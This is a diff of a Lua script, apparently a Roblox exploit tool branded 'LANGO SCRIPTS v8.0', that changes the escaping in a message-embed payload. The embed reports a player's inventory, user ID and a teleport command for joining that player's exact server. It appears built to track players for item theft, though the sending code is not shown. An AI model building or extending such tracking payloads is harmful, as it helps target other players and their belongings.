@@ -383,12 +383,12 @@ local ansiLine4 = esc .. "[2;37mUncommon: " .. rarityCounts.Uncommon .. "  Commo
 
 table.insert(fields, {
     name = "📊 Inventory",
-    value = "\`\`\`ansi\n"
+    value = "\\`\\`\\`ansi\n"
         .. ansiLine1 .. "\n"
         .. ansiLine2 .. "\n"
         .. ansiLine3 .. "\n"
         .. ansiLine4
-        .. "\n\`\`\`",
+        .. "\\n\\`\\`\\`",
     inline = false
 })
 
@@ -415,7 +415,14 @@ local payload = {
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
-        description = "\\`\\`\\`lua\\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\\n\\`\\`\\`",
+        description =
+    "\\`\\`\\`lua\\n"
+    .. "game:GetService('TeleportService'):TeleportToPlaceInstance("
+    .. PlaceId
+    .. ", '"
+    .. REAL_JOB_ID
+    .. "')\\n"
+    .. "\\`\\`\\`",
         fields = fields,
         footer = {text = " LANGO SCRIPTS v8.0"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
